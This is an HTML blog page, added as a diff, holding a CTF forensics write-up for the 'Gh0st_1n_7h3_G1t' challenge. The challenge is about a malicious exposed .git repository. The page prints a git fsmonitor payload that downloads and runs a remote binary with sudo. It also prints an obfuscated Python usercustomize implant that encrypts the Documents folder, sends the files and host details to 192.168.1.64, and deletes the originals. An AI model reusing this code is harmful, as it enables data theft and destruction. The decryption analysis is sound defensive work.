@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Gh0st_1n_7h3_G1t - Writeup – Blog – Insomnia</title>
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/atom-one-dark.min.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="brand" href="../index.html" aria-label="Accueil">Insomnia</a>
+      <nav class="nav" aria-label="Navigation principale">
+        <button class="nav-toggle" aria-expanded="false" aria-controls="nav-list" aria-label="Menu">☰</button>
+        <ul id="nav-list" class="nav-list">
+          <li><a href="../index.html">Accueil</a></li>
+          <li><a href="../parcours.html">Parcours</a></li>
+          <li><a href="../competences.html">Compétences</a></li>
+          <li><a href="../veille.html">Veille</a></li>
+          <li><a href="../blog.html">Blog</a></li>
+          <li><a href="mailto:insomnia@0xinsomnia.me">Contact</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main id="content" class="section">
+    <div class="container narrow">
+      <p class="kicker">$ blog / ctf / Gh0st_1n_7h3_G1t</p>
+      <h1 class="section-title">Gh0st_1n_7h3_G1t - Writeup</h1>
+      <p class="lead">Chall created by Me and un_humain&fregate - MIDNIGHT FLAG 2026 qualifiers</p>
+      <figure class="post-banner"><img src="../assets/img/MIDNIGHT_2026_banner.png" alt="Gh0st_1n_7h3_G1t - Writeup" loading="lazy"></figure>
+      <article class="reveal in-view markdown-content">
+        <h2>Challenge Description</h2>
+<p>Your friend, a bug hunter, has asked for your help. After completing a bug bounty program, he realized that he lost his report for another program. He is asking you to recover it and understand what happened on his machine.<br />
+He finds the recent bug bounty program suspicious, as it seemed very empty and illogical.<br />
+VM credentials:<br />
+Username: john / root<br />
+Root password: root<br />
+You are provided with a PCAP file as well as a VirtualBox VM.</p>
+<h2>Objectives</h2>
+<ul>
+<li>Recover the lost bug bounty report</li>
+<li>Analyze the VM for any suspicious activity</li>
+<li>Identify potential vulnerabilities and exploit them</li>
+</ul>
+<h2>Investigation</h2>
+<p>We start on the bug hunter VM and immediately notice a <code>Project</code> directory.<br />
+<img alt="Project directory" src="../assets/img/ghost_in_the_git/image-3.png" /></p>
+<p>This screenshot shows a <code>note.txt</code> file, a bash script, an <code>exploit</code> directory, and a suspicious <code>bug-git</code> directory.<br />
+<img alt="Contents of the Project directory" src="../assets/img/ghost_in_the_git/image-4.png" /></p>
+<p><code>note.txt</code> contains:</p>
+<pre><code class="language-text">+ Server: Werkzeug/3.1.6 Python/3.13.5
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, HEAD, GET
++ Server leaks inodes via ETags, header found with file /.git/index, inode: 100702487332, size: 2310, mtime: 0x797904668
++ Uncommon header 'content-disposition' found, with contents: inline; filename=index
++ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
++ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2026-03-03 19:25:05 (GMT0) (14 seconds)
+</code></pre>
+<p>This strongly suggests that a <code>.git</code> directory was exposed and likely downloaded into <code>bug-git</code>.</p>
+<p>Inside <code>/bin</code>, we can see <code>git-dumper</code>, which confirms that the <code>bug-git</code> directory most likely came from the web server.<br />
+<img alt="git-dumper present on the VM" src="../assets/img/ghost_in_the_git/image-5.png" /></p>
+<p>Inside <code>bug-git</code>, we find a <code>.git</code> directory with the following structure, including a <code>config</code> file that deserves immediate attention.<br />
+<img alt="Suspicious Git directory structure" src="../assets/img/ghost_in_the_git/image-6.png" /></p>
+<p>The <code>config</code> file contains a payload inside the <code>fsmonitor</code> parameter. That parameter allows bash command execution after <code>git checkout</code>, <code>git status</code>, and similar Git commands. Those commands are used by <code>git-dumper</code>, which runs <code>git checkout</code> by default.<br />
+<img alt="Malicious fsmonitor payload" src="../assets/img/ghost_in_the_git/image-7.png" /></p>
+<pre><code class="language-bash">curl -k -s -o /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 https://192.168.1.64:8443/payload &amp;&amp; chmod +x /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 &amp;&amp; sudo /tmp/bbf496b0cb0e34a44b72f4ee97c0db02 &amp;&amp; echo 'e1RoMVNfSXNfWTB1Ul9mN3JzdF9QQHJ0fQ==' &gt; /dev/null
+</code></pre>
+<p>This reveals the first part of the flag, encoded in Base64.<br />
+<img alt="First part of the flag" src="../assets/img/ghost_in_the_git/image-8.png" /></p>
+<p>Let's continue the investigation.</p>
+<p>There is also an error related to Python.<br />
+<img alt="Python error message" src="../assets/img/ghost_in_the_git/image-9.png" /></p>
+<p>So we test Python directly.<br />
+<img alt="Testing Python" src="../assets/img/ghost_in_the_git/image-10.png" /></p>
+<p>We can see an error involving <code>usercustomize</code>, so we inspect it.<br />
+<img alt="usercustomize issue" src="../assets/img/ghost_in_the_git/image-11.png" /></p>
+<pre><code class="language-python">import os
+import ssl
+import json
+import socket
+import struct
+import hashlib
+import urllib.request
+import base64
+
+
+_0xfb8c4d = __import__(base64.b64decode(b&quot;cGxhdGZvcm0=&quot;).decode())
+_0x3e9a7f = __import__(base64.b64decode(b&quot;Z2V0cGFzcw==&quot;).decode())
+
+_0x4a2b8f = base64.b64decode(b&quot;MTkyLjE2OC4xLjY0&quot;).decode()
+
+_0x7d3c9a = ssl.create_default_context()
+_0x7d3c9a.check_hostname = False
+_0x7d3c9a.verify_mode    = ssl.CERT_NONE
+
+def _0x9f4e2a(v, n):
+    return ((v &lt;&lt; n) | (v &gt;&gt; (32 - n))) &amp; 0xFFFFFFFF
+
+def _0x6b1d7c(a, b, c, d):
+    a = (a + b) &amp; 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 16)
+    c = (c + d) &amp; 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 12)
+    a = (a + b) &amp; 0xFFFFFFFF; d ^= a; d = _0x9f4e2a(d, 8)
+    c = (c + d) &amp; 0xFFFFFFFF; b ^= c; b = _0x9f4e2a(b, 7)
+    return a, b, c, d
+
+def _0x3c8f5b(key: bytes, counter: int, nonce: bytes) -&gt; bytes:
+    _0x1a4e9f = base64.b64decode(b&quot;ZXhwYW5kIDMyLWJ5dGUgaw==&quot;)
+    state = list(struct.unpack(base64.b64decode(b&quot;PDE2SQ==&quot;).decode(),
+        _0x1a4e9f +
+        key[:32] +
+        struct.pack(base64.b64decode(b&quot;PEk=&quot;).decode(), counter &amp; 0xFFFFFFFF) +
+        nonce[:12]
+    ))
+
+    working = state[:]
+    for _ in range(10):
+        working[0],  working[4],  working[8],  working[12] = _0x6b1d7c(working[0],  working[4],  working[8],  working[12])
+        working[1],  working[5],  working[9],  working[13] = _0x6b1d7c(working[1],  working[5],  working[9],  working[13])
+        working[2],  working[6],  working[10], working[14] = _0x6b1d7c(working[2],  working[6],  working[10], working[14])
+        working[3],  working[7],  working[11], working[15] = _0x6b1d7c(working[3],  working[7],  working[11], working[15])
+        working[0],  working[5],  working[10], working[15] = _0x6b1d7c(working[0],  working[5],  working[10], working[15])
+        working[1],  working[6],  working[11], working[12] = _0x6b1d7c(working[1],  working[6],  working[11], working[12])
+        working[2],  working[7],  working[8],  working[13] = _0x6b1d7c(working[2],  working[7],  working[8],  working[13])
+        working[3],  working[4],  working[9],  working[14] = _0x6b1d7c(working[3],  working[4],  working[9],  working[14])
+
+    output = [(working[i] + state[i]) &amp; 0xFFFFFFFF for i in range(16)]
+    return struct.pack(base64.b64decode(b&quot;PDE2SQ==&quot;).decode(), *output)
+
+def _0x8e2a6d(plaintext: bytes, key: bytes, nonce: bytes, counter: int = 0) -&gt; bytes:
+    ciphertext = bytearray()
+    for i in range(0, len(plaintext), 64):
+        block    = _0x3c8f5b(key, counter + i // 64, nonce)
+        chunk    = plaintext[i:i + 64]
+        ciphertext += bytes(a ^ b for a, b in zip(chunk, block))
+    return bytes(ciphertext)
+
+
+_0x2f7b4a = getattr(_0xfb8c4d, base64.b64decode(b&quot;bm9kZQ==&quot;).decode())()
+_0x9c3e1d = getattr(_0xfb8c4d, base64.b64decode(b&quot;cmVsZWFzZQ==&quot;).decode())()
+_0x5a6f8b = getattr(_0x3e9a7f, base64.b64decode(b&quot;Z2V0dXNlcg==&quot;).decode())()
+
+try:
+    with open(base64.b64decode(b&quot;L2V0Yy9tYWNoaW5lLWlk&quot;).decode(), base64.b64decode(b&quot;cg==&quot;).decode()) as f:
+        _0x4d8c2e = f.read().strip()
+except FileNotFoundError:
+    _0x4d8c2e = base64.b64decode(b&quot;dW5rbm93bg==&quot;).decode()
+
+
+def _0x7f9d3a():
+    _0x1f45e0 = {
+        base64.b64decode(b&quot;aG9zdG5hbWU=&quot;).decode(): _0x2f7b4a,
+        base64.b64decode(b&quot;a2VybmVs&quot;).decode():   _0x9c3e1d,
+        base64.b64decode(b&quot;dXNlcm5hbWU=&quot;).decode(): _0x5a6f8b,
+        base64.b64decode(b&quot;bWFjaGluZV9pZA==&quot;).decode(): _0x4d8c2e,
+    }
+
+    _0x6e4a2f = base64.b64decode(b&quot;aHR0cHM6Ly8=&quot;).decode() + _0x4a2b8f + base64.b64decode(b&quot;Ojg0NDM=&quot;).decode()
+
+    body = json.dumps(_0x1f45e0).encode()
+    req  = urllib.request.Request(
+        _0x6e4a2f + base64.b64decode(b&quot;L2pzb24=&quot;).decode(),
+        data=body,
+        headers={base64.b64decode(b&quot;Q29udGVudC1UeXBl&quot;).decode(): base64.b64decode(b&quot;YXBwbGljYXRpb24vanNvbg==&quot;).decode()},
+        method=base64.b64decode(b&quot;UE9TVA==&quot;).decode(),
+    )
+    with urllib.request.urlopen(req, context=_0x7d3c9a) as resp:
+        resp.read()
+
+
+def _0x1b5e9c() -&gt; tuple[bytes, bytes]:
+    seed   = f&quot;{_0x2f7b4a}:{_0x9c3e1d}:{_0x4d8c2e}:{_0x5a6f8b}&quot;
+    digest = hashlib.sha512(seed.encode()).digest()
+    key    = digest[:32]
+    nonce  = digest[32:44]
+    return key, nonce
+
+
+def _0x3a7f2d(filename: str, data: bytes):
+    _0x9b4e6c = 9000
+
+    name_bytes = filename.encode(base64.b64decode(b&quot;dXRmLTg=&quot;).decode())
+    with socket.create_connection((_0x4a2b8f, _0x9b4e6c)) as sock:
+        sock.sendall(struct.pack(base64.b64decode(b&quot;Pkk=&quot;).decode(), len(name_bytes)))
+        sock.sendall(name_bytes)
+        sock.sendall(struct.pack(base64.b64decode(b&quot;Pkk=&quot;).decode(), len(data)))
+        sock.sendall(data)
+        sock.recv(3)
+
+
+_0x8c1d4f   = os.path.join(os.path.expanduser(base64.b64decode(b&quot;fg==&quot;).decode()), base64.b64decode(b&quot;RG9jdW1lbnRz&quot;).decode())
+key, nonce = _0x1b5e9c()
+
+_0x7f9d3a()
+
+for fname in os.listdir(_0x8c1d4f):
+    fpath = os.path.join(_0x8c1d4f, fname)
+    if not os.path.isfile(fpath):
+        continue
+
+    with open(fpath, base64.b64decode(b&quot;cmI=&quot;).decode()) as f:
+        plaintext = f.read()
+
+    ciphertext = _0x8e2a6d(plaintext, key, nonce)
+    _0x3a7f2d(fname + base64.b64decode(b&quot;LmhlbGxjYXQ=&quot;).decode(), ciphertext)
+    os.remove(fpath)
+</code></pre>
+<p>We can see that the script obfuscates function names, variable names, and strings with Base64.<br />
+After analyzing it, we can identify a ChaCha20 implementation because it contains:</p>
+<ul>
+<li>32-bit left rotations</li>
+<li>quarter rounds</li>
+<li>64-byte block generation</li>
+<li>a final XOR step</li>
+</ul>
+<p>The script targets the user's <code>Documents</code> directory and exfiltrates the data to an external server at <code>192.168.1.64</code> over ports <code>9000</code> and <code>8443</code>. The encrypted data is sent over port <code>9000</code>.</p>
+<p>We collect the following values because they are used to encrypt the file:<br />
+<img alt="Recovered hostname" src="../assets/img/ghost_in_the_git/image-12.png" /><br />
+<img alt="Recovered kernel version" src="../assets/img/ghost_in_the_git/image-13.png" /><br />
+<img alt="Recovered machine ID" src="../assets/img/ghost_in_the_git/image-14.png" /><br />
+<img alt="Recovered username" src="../assets/img/ghost_in_the_git/image-15.png" /></p>
+<p>We run <code>tshark</code> on the PCAP to extract the encrypted file:</p>
+<pre><code class="language-bash">tshark -r capture.pcap -Y &quot;tcp.dstport == 9000 &amp;&amp; ip.dst == 192.168.1.64 &amp;&amp; tcp.payload&quot; -T fields -e tcp.payload | tr -d '\n' | xxd -r -p &gt; exfiltrated_raw.bin
+</code></pre>
+<p>Here is the Python script used to decrypt the content:</p>
+<pre><code class="language-python">import hashlib
+import struct
+from Crypto.Cipher import ChaCha20
+
+
+hostname   = &quot;midnight&quot;
+kernel     = &quot;6.17.0-14-generic&quot;
+machine_id = &quot;6ea3ad95b0cb495d86291db1c798247f&quot;
+username   = &quot;john&quot;
+
+
+seed = f&quot;{hostname}:{kernel}:{machine_id}:{username}&quot;
+digest = hashlib.sha512(seed.encode()).digest()
+
+key   = digest[:32]
+nonce = digest[32:44]
+
+print(&quot;Key   :&quot;, key.hex())
+print(&quot;Nonce :&quot;, nonce.hex())
+
+
+with open(&quot;exfiltrated_raw.bin&quot;, &quot;rb&quot;) as f:
+    name_len = struct.unpack(&quot;&gt;I&quot;, f.read(4))[0]
+    filename = f.read(name_len).decode(&quot;utf-8&quot;)
+    data_len = struct.unpack(&quot;&gt;I&quot;, f.read(4))[0]
+    ciphertext = f.read(data_len)
+
+
+cipher = ChaCha20.new(key=key, nonce=nonce)
+plaintext = cipher.decrypt(ciphertext)
+
+out_name = filename.removesuffix(&quot;.hellcat&quot;) if filename.endswith(&quot;.hellcat&quot;) else &quot;decrypted.bin&quot;
+with open(out_name, &quot;wb&quot;) as f:
+    f.write(plaintext)
+
+print(out_name)
+</code></pre>
+<p>This gives us a PDF file.<br />
+<img alt="Decrypted PDF recovered" src="../assets/img/ghost_in_the_git/image-16.png" /></p>
+<p>By reading that report, we find the final part of the flag:<br />
+<img alt="Final flag fragment" src="../assets/img/ghost_in_the_git/image-17.png" /></p>
+<p>Final part: <code>MCTF{0x_F1n@l_P4rt$}</code></p>
+<p>Complete flag: <code>MCTF{Th1S_Is_Y0uR_f7rst_P@rt0x_F1n@l_P4rt$}</code></p>
+        <p><a class="link" href="../blog.html">← Retour au blog</a></p>
+      </article>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-left">
+        <p class="footer-note">Made with <span class="heart" aria-hidden="true">❤️</span> by <strong>Insomnia</strong> • <span id="year"></span></p>
+      </div>
+      <div class="footer-right">
+        <ul class="footer-social">
+          <li><a class="social-link" href="https://github.com/nowzee" target="_blank" rel="noopener" aria-label="GitHub"><svg viewBox="0 0 24 24" class="icon"><path fill="currentColor" d="M12 .5C5.73.5.99 5.24.99 11.52c0 4.86 3.16 8.98 7.55 10.43.55.1.76-.24.76-.54 0-.27-.01-1.17-.02-2.12-3.07.67-3.72-1.31-3.72-1.31-.5-1.26-1.23-1.6-1.23-1.6-.99-.68.08-.66.08-.66 1.1.08 1.68 1.13 1.68 1.13.98 1.68 2.58 1.19 3.21.9.1-.71.38-1.19.69-1.46-2.45-.28-5.02-1.22-5.02-5.43 0-1.2.43-2.18 1.13-2.95-.11-.28-.49-1.41.11-2.94 0 0 .92-.3 3.02 1.13a10.5 10.5 0 0 1 5.5 0c2.1-1.43 3.02-1.13 3.02-1.13.6 1.53.22 2.66.11 2.94.7.77 1.13 1.75 1.13 2.95 0 4.22-2.58 5.15-5.03 5.42.39.33.73.98.73 1.98 0 1.43-.01 2.58-.01 2.94 0 .3.2.64.77.53 4.38-1.45 7.54-5.56 7.54-10.42C23 5.24 18.27.5 12 .5Z"/></svg></a></li>
+          <li><a class="social-link" href="mailto:insomnia@0xinsomnia.me" aria-label="Email"><svg viewBox="0 0 24 24" class="icon"><path fill="currentColor" d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 4-8 5L4 8V6l8 5 8-5v2Z"/></svg></a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
